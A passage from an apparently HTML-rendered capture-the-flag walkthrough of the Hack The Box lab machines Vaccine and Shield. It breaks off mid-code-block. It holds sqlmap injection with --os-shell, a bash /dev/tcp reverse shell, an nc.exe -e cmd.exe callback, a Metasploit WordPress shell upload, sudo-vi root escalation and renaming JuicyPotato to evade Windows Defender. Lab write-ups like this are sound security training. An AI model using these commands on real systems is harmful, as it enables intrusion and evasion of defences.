  
  header<span class="o">(</span><span class="s2">&#34;Location: dashboard.php&#34;</span><span class="o">)</span><span class="p">;</span>
  
  <span class="o">}</span>
  
  <span class="o">}</span>
  
  ?&gt;
  --------------------------------------------------------------------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p>The input password is hashed into a MD5 hash:
<strong>2cb42f8734ea607eefed3b70af13bbd3</strong>. T</p>
<p>This hash can be easily cracked using an online rainbow table such as
crackstation.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image79.png"
        data-srcset="/startingpoint/media/image79.png, media/image79.png 1.5x, /startingpoint/media/image79.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image79.png"
        title="/startingpoint/media/image79.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/>{width=&ldquo;5.7659722222222225in&rdquo;
height=&ldquo;3.2916666666666665in&rdquo;}</p>
<p>The result is : <strong>qwerty789</strong></p>
<h3 id="9702-foothold-2">◦ Foothold</h3>
<p>======================</p>
<p>Browsing to port 80, we can see a login page for MegaCorp.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image80.png"
        data-srcset="/startingpoint/media/image80.png, media/image80.png 1.5x, /startingpoint/media/image80.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image80.png"
        title="IMG_256"
        style="width: 100%;object-fit: cover;margin: 0pt;"/>{width=&ldquo;6.147222222222222in&rdquo;
height=&ldquo;2.2847222222222223in&rdquo;}</p>
<p>The credentials <strong>admin / qwerty789</strong> can be used to login.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image81.png"
        data-srcset="/startingpoint/media/image81.png, media/image81.png 1.5x, /startingpoint/media/image81.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image81.png"
        title="IMG_256"
        style="width: 100%;object-fit: cover;margin: 0pt;"/>{width=&ldquo;6.0784722222222225in&rdquo;
height=&ldquo;2.8097222222222222in&rdquo;}</p>
<p>The page is found to host a Car Catalogue, and contains functionality to
search for products.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image82.png"
        data-srcset="/startingpoint/media/image82.png, media/image82.png 1.5x, /startingpoint/media/image82.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image82.png"
        title="/startingpoint/media/image82.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/>{width=&ldquo;5.572916666666667in&rdquo;
height=&ldquo;0.4479166666666667in&rdquo;}</p>
<p>Searching for example fo the term “a”, results in the following request.</p>
<p><strong>http://10.10.10.46/dashboard.php?search=a</strong></p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image83.png"
        data-srcset="/startingpoint/media/image83.png, media/image83.png 1.5x, /startingpoint/media/image83.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image83.png"
        title="/startingpoint/media/image83.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/>{width=&ldquo;5.760416666666667in&rdquo; height=&ldquo;3.0875in&rdquo;}</p>
<p>The page takes in a GET request with the parameter search. This URL is
supplied to sqlmap, in order to test for SQL injection vulnerabilities.
The website uses cookies, which can be specified using &ndash;cookie.</p>
<p>Right-click the page and select Inspect Element. Click the Storage tab
and copy the PHP Session ID.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image84.png"
        data-srcset="/startingpoint/media/image84.png, media/image84.png 1.5x, /startingpoint/media/image84.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image84.png"
        title="/startingpoint/media/image84.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/>{width=&ldquo;5.759027777777778in&rdquo; height=&ldquo;1.4625in&rdquo;}</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image85.png"
        data-srcset="/startingpoint/media/image85.png, media/image85.png 1.5x, /startingpoint/media/image85.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image85.png"
        title="/startingpoint/media/image85.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/>{width=&ldquo;3.1145833333333335in&rdquo; height=&ldquo;0.625in&rdquo;}</p>
<p>WE see the PHPSESSID value is :&quot;<strong>gub9n3ugpgc5obsre8jkv8tq3m</strong>&quot;</p>
<p>We can construct the Sqlmap query as follows:</p>
<p>**sqlmap -u &lsquo;http://10.10.10.46/dashboard.php?search=a’
&ndash;cookie=&quot;**PHPSESSID=<strong>gub9n3ugpgc5obsre8jkv8tq3m&quot;</strong></p>
<p>Sqlmap found the page to be vulnerable to multiple injections, and
identified the backend DBMS to be PostgreSQL.</p>
<p><em><strong>Getting code execution in postgres is trivial using the &ndash;os-shell
command.</strong></em></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  -----------------------------------------------------------------------------------------------------------------------
  **sqlmap -u <span class="s1">&#39;http://10.10.10.46/dashboard.php?search=a&#39;</span> --cookie<span class="o">=</span><span class="s2">&#34;PHPSESSID=gub9n3ugpgc5obsre8jkv8tq3m&#34;</span> --os-shell **
  
  ....
  
  <span class="se">\[\*\]</span> starting @ 15:32:32 /2020-07-03/
  
  ....
  
  ....
  
  Parameter: search <span class="o">(</span>GET<span class="o">)</span>
  
  ....
  
  Title: PostgreSQL &gt; 8.1 stacked queries <span class="o">(</span>comment<span class="o">)</span>
  
  Payload: <span class="nv">search</span><span class="o">=</span>a<span class="s1">&#39;;SELECT PG\_SLEEP(5)--
</span><span class="s1">  
</span><span class="s1">  Type: time-based blind
</span><span class="s1">  
</span><span class="s1">  Title: PostgreSQL &gt; 8.1 AND time-based blind
</span><span class="s1">  
</span><span class="s1">  Payload: search=a&#39;</span> AND <span class="nv">8079</span><span class="o">=(</span>SELECT <span class="m">8079</span> FROM PG<span class="se">\_</span>SLEEP<span class="o">(</span>5<span class="o">))</span>-- dEyh
  
  ....
  
  ....
  
  <span class="se">\[</span>15:32:34<span class="se">\]</span> <span class="se">\[</span>INFO<span class="se">\]</span> going to use <span class="s1">&#39;COPY ... FROM PROGRAM ...&#39;</span> <span class="nb">command</span> execution
  
  <span class="se">\[</span>15:32:34<span class="se">\]</span> <span class="se">\[</span>INFO<span class="se">\]</span> calling Linux OS shell. To quit <span class="nb">type</span> <span class="s1">&#39;x&#39;</span> or <span class="s1">&#39;q&#39;</span> and press ENTER
  
  **os-shell&gt; **
  -----------------------------------------------------------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image86.png"
        data-srcset="/startingpoint/media/image86.png, media/image86.png 1.5x, /startingpoint/media/image86.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image86.png"
        title="/startingpoint/media/image86.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/>{width=&ldquo;5.759027777777778in&rdquo;
height=&ldquo;1.4895833333333333in&rdquo;}</p>
<h3 id="9702-privilege-escalation">◦ Privilege Escalation</h3>
<p>======================</p>
<p>This can be used to execute a bash reverse shell.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  --------------------------------------------------------------------
  **bash -c <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/&lt;your\_ip&gt;/4444 0&gt;&amp;1&#39;</span>**
  --------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image87.png"
        data-srcset="/startingpoint/media/image87.png, media/image87.png 1.5x, /startingpoint/media/image87.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image87.png"
        title="/startingpoint/media/image87.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/>{width=&ldquo;5.7659722222222225in&rdquo; height=&ldquo;1.9375in&rdquo;}</p>
<p>Let&rsquo;s upgrade to a tty shell and continue enumeration.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  -----------------------------------------
  **SHELL<span class="o">=</span>/bin/bash script -q /dev/null**
  -----------------------------------------
</code></pre></td></tr></table>
</div>
</div><p>Let’s have a look to the source code of dashboard.php in /var/www/html.</p>
<p>The code reveals the postgres password to be: <strong>P@s5w0rd!</strong></p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image88.png"
        data-srcset="/startingpoint/media/image88.png, media/image88.png 1.5x, /startingpoint/media/image88.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image88.png"
        title="/startingpoint/media/image88.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/>{width=&ldquo;5.7659722222222225in&rdquo; height=&ldquo;0.375in&rdquo;}</p>
<p>This password can be used to view the user&rsquo;s sudo privileges.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image89.png"
        data-srcset="/startingpoint/media/image89.png, media/image89.png 1.5x, /startingpoint/media/image89.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image89.png"
        title="/startingpoint/media/image89.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/>{width=&ldquo;5.7652777777777775in&rdquo;
height=&ldquo;1.1513888888888888in&rdquo;}</p>
<p>The user is allowed to edit the configuration
<strong>/etc/postgresql/11/main/pg_hba.conf</strong> using vi. This can be leveraged
to gain a root shell and access root.txt.</p>
<p>Once opened the file in “<strong>Vi</strong>” editor with sudo, we can spawn a TTY
shell from within vi by just typing:</p>
<ul>
<li>
<p>:!<strong>0</strong>bash</p>
</li>
<li>
<p>:set shell=**/<strong>bin</strong>/**bash:shell</p>
</li>
<li>
<p>:!/bin/bash</p>
</li>
</ul>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image90.png"
        data-srcset="/startingpoint/media/image90.png, media/image90.png 1.5x, /startingpoint/media/image90.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image90.png"
        title="/startingpoint/media/image90.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/>{width=&ldquo;5.764583333333333in&rdquo;
height=&ldquo;6.316666666666666in&rdquo;}</p>
<p>As we can see, now we have a TTY as root.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image91.png"
        data-srcset="/startingpoint/media/image91.png, media/image91.png 1.5x, /startingpoint/media/image91.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image91.png"
        title="/startingpoint/media/image91.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/>{width=&ldquo;5.763194444444444in&rdquo; height=&ldquo;4.34375in&rdquo;}</p>
<h2 id="9656-shield">▸ SHIELD</h2>
<h3 id="9702-about-2">◦ About</h3>
<p>======================</p>
<p>This box features only a root flag. Don&rsquo;t waste your time on finding the user.txt - until this is corrected by the Dev Team. I&rsquo;ve raised this issue already, so this article will be updated accordingly when status is changed. UPDATE: Apparently this is solved right now and information &ldquo;No Flag&rdquo; for user flag is shown correctly both for Shield and Vaccine.</p>
<ul>
<li>Machine : <b>Shield</b> </li>
<li>Ip: <b>10.10.10.29</b></li>
</ul>
<h3 id="9702-enumeration-1">◦ Enumeration</h3>
<p>======================</p>
<p><em><strong>sudo nmap -sC -sV 10.10.10.29</strong></em></p>
<p>From the Nmap output, we find that <strong>IIS</strong> and <strong>MySQL</strong> are running on
their default ports. IIS (Internet Information Services) is a Web Server
created by Microsoft.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">  -----------------------------------------------------------------
  Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-09 12:59 EDT
  
  Nmap scan report for 10.10.10.29
  
  Host is up (0.044s latency).
  
  Not shown: 998 filtered ports
  
  PORT STATE SERVICE VERSION
  
  **80/tcp open http Microsoft IIS httpd 10.0**
  
  | http-methods:
  
  |\_ Potentially risky methods: TRACE
  
  |\_http-server-header: Microsoft-IIS/10.0
  
  |\_http-title: IIS Windows Server
  
  **3306/tcp open mysql MySQL (unauthorized)**
  
  Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
  -----------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s navigate to port 80 using a browser.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image92.png"
        data-srcset="/startingpoint/media/image92.png, media/image92.png 1.5x, /startingpoint/media/image92.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image92.png"
        title="IMG_256"
        style="width: 100%;object-fit: cover;margin: 0pt;"/>{width=&ldquo;5.78125in&rdquo;
height=&ldquo;2.4034722222222222in&rdquo;}</p>
<p>We see the default IIS starting page.</p>
<p>Let&rsquo;s use GoBuster to scan for any sub-directories or files that are
hosted on the server.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image93.png"
        data-srcset="/startingpoint/media/image93.png, media/image93.png 1.5x, /startingpoint/media/image93.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image93.png"
        title="/startingpoint/media/image93.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We do found the “/<strong>wordpress”</strong> folder.</p>
<p>WordPress is a Content Management System (CMS) that can be used to
quickly create websites and blogs.</p>
<p>Let’s do another search using “dirsearch” and pointing directly to that
folder</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image94.png"
        data-srcset="/startingpoint/media/image94.png, media/image94.png 1.5x, /startingpoint/media/image94.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image94.png"
        title="/startingpoint/media/image94.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image95.png"
        data-srcset="/startingpoint/media/image95.png, media/image95.png 1.5x, /startingpoint/media/image95.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image95.png"
        title="/startingpoint/media/image95.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We do see some interesting folder and files.</p>
<p>Since we have already acquired the password <strong>P@s5w0rd!,</strong> we can try to
login to the WordPress site.</p>
<p>We navigate to http://10.10.10.29/wordpress/wp-login.php and try to
guess the username.</p>
<p>Some common usernames are <strong>admin</strong> or <strong>administrator</strong>.</p>
<p>The combination <strong>admin</strong> : <strong>P@s5w0rd!</strong> is successful and we gain
administrative access to the site.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image96.png"
        data-srcset="/startingpoint/media/image96.png, media/image96.png 1.5x, /startingpoint/media/image96.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image96.png"
        title="/startingpoint/media/image96.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<h3 id="9702-foothold-3">◦ Foothold</h3>
<p>====================</p>
<p>The administrative access can be leveraged through the msfmodule
<strong>“exploit/ unix/webapp/wp_admin_shell_upload”</strong>, to get a
meterpreter shell on the system. Let’s follow the following commands in
order to get a session:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  -----------------------------------------------------------
  msfconsole
  
  msf &gt; use exploit/unix/webapp/wp<span class="se">\_</span>admin<span class="se">\_</span>shell<span class="se">\_</span>upload
  
  msf &gt; <span class="nb">set</span> PASSWORD P@s5w0rd!
  
  msf &gt; <span class="nb">set</span> USERNAME admin
  
  msf &gt; <span class="nb">set</span> TARGETURI /wordpress
  
  msf &gt; <span class="nb">set</span> RHOSTS 10.10.10.29
  
  msf &gt; run
  -----------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image97.png"
        data-srcset="/startingpoint/media/image97.png, media/image97.png 1.5x, /startingpoint/media/image97.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image97.png"
        title="/startingpoint/media/image97.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image98.png"
        data-srcset="/startingpoint/media/image98.png, media/image98.png 1.5x, /startingpoint/media/image98.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image98.png"
        title="/startingpoint/media/image98.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Now that we got a meterpreter shell, we can use netcat (nc.exe) tp get a
more stable shell.</p>
<p>So let’s locate the binary.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image99.png"
        data-srcset="/startingpoint/media/image99.png, media/image99.png 1.5x, /startingpoint/media/image99.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image99.png"
        title="/startingpoint/media/image99.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Let’s copy <strong>nc.exe</strong> into our “Tools” directory</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image100.png"
        data-srcset="/startingpoint/media/image100.png, media/image100.png 1.5x, /startingpoint/media/image100.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image100.png"
        title="/startingpoint/media/image100.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/>
<img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image101.png"
        data-srcset="/startingpoint/media/image101.png, media/image101.png 1.5x, /startingpoint/media/image101.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image101.png"
        title="/startingpoint/media/image101.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>From within the meterpeter session, let’s move to oyr local Tools
directory</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image102.png"
        data-srcset="/startingpoint/media/image102.png, media/image102.png 1.5x, /startingpoint/media/image102.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image102.png"
        title="/startingpoint/media/image102.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We can use the <strong>lcd</strong> command ( <strong>lcd</strong> stands for &ldquo;<strong>Local Change
Directory</strong>&rdquo;, which we use to navigate to the local folder where
<em>nc.exe</em> is located.):</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image103.png"
        data-srcset="/startingpoint/media/image103.png, media/image103.png 1.5x, /startingpoint/media/image103.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image103.png"
        title="/startingpoint/media/image103.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>So, lwt’s move to the “/home/kali/HTB/StartingPoint/Tools” folder where
the “nc.exe” binary is located</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image104.png"
        data-srcset="/startingpoint/media/image104.png, media/image104.png 1.5x, /startingpoint/media/image104.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image104.png"
        title="/startingpoint/media/image104.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We then navigate to a writeable directory on the server (in our case
<strong>C:/inetpub/wwwroot/wordpress/wp-content/upload</strong>s) and upload netcat.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image105.png"
        data-srcset="/startingpoint/media/image105.png, media/image105.png 1.5x, /startingpoint/media/image105.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image105.png"
        title="/startingpoint/media/image105.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>The command to use is the “upload” command: <strong>upload nc.exe</strong></p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image106.png"
        data-srcset="/startingpoint/media/image106.png, media/image106.png 1.5x, /startingpoint/media/image106.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image106.png"
        title="/startingpoint/media/image106.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We can see now the nc.exe program in the “upload” folder</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image106.png"
        data-srcset="/startingpoint/media/image106.png, media/image106.png 1.5x, /startingpoint/media/image106.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image106.png"
        title="/startingpoint/media/image106.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<h3 id="9702-using-netcat">◦ <em><strong>Using Netcat</strong></em></h3>
<p>On another terminal we can now launch a listener</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  ------------------
  **nc -lvp 1234**
  ------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image107.png"
        data-srcset="/startingpoint/media/image107.png, media/image107.png 1.5x, /startingpoint/media/image107.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image107.png"
        title="/startingpoint/media/image107.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Next, we can execute the following command into the meterpreter session</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  --------------------------------------------------------
  **execute -f nc.exe -a <span class="s2">&#34;-e cmd.exe 10.10.14.16 1234&#34;</span>**
  --------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image108.png"
        data-srcset="/startingpoint/media/image108.png, media/image108.png 1.5x, /startingpoint/media/image108.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image108.png"
        title="/startingpoint/media/image108.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>And we get a netcat shell:</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image109.png"
        data-srcset="/startingpoint/media/image109.png, media/image109.png 1.5x, /startingpoint/media/image109.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image109.png"
        title="/startingpoint/media/image109.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<h3 id="9702-privilege-escalation-1">◦ Privilege Escalation</h3>
<p>======================</p>
<p>Running the “<strong>sysinfo</strong>” command on the meterpreter session, we notice
that this is a Windows Server 2016 OS, which is vulnerable to the
<em>Rotten Potato</em> exploit.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image110.png"
        data-srcset="/startingpoint/media/image110.png, media/image110.png 1.5x, /startingpoint/media/image110.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image110.png"
        title="/startingpoint/media/image110.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Let’s download the “<strong>JuicyPotato.exe</strong>” binary frome here :
<em><a href="https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe" target="_blank" rel="noopener noreffer">https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe</a></em></p>
<p>Let’s save the binary into our “<strong>Tools”</strong> folder</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image111.png"
        data-srcset="/startingpoint/media/image111.png, media/image111.png 1.5x, /startingpoint/media/image111.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image111.png"
        title="/startingpoint/media/image111.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p><em><strong>NOTE:</strong></em> Sometimes browser does not allow the download</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image112.png"
        data-srcset="/startingpoint/media/image112.png, media/image112.png 1.5x, /startingpoint/media/image112.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image112.png"
        title="/startingpoint/media/image112.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>In this situation we can use the following command:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  -------------------------------------------------------------------------------------------
  **sudo wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe**
  -------------------------------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p>Then with the lcd command we move to the “<strong>Tools”</strong> folder from the
meterpreter shell and we procede with the upload of the
“JuicyPotato.exe” into the “<strong>uploads”</strong> folder.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image113.png"
        data-srcset="/startingpoint/media/image113.png, media/image113.png 1.5x, /startingpoint/media/image113.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image113.png"
        title="/startingpoint/media/image113.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p><em><strong>NOTE:</strong></em> We will have to rename the Juicy Potato executable to
something else, otherwise it will be picked up by Windows Defender.</p>
<p><em>From the meterpeter session we can use this command:</em></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  -------------------------------
  **mv JuicyPotato.exe js.exe**
  -------------------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image114.png"
        data-srcset="/startingpoint/media/image114.png, media/image114.png 1.5x, /startingpoint/media/image114.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image114.png"
        title="/startingpoint/media/image114.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>From the reverse shell on a Windows Machine we can use this command:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  -----------------------------------
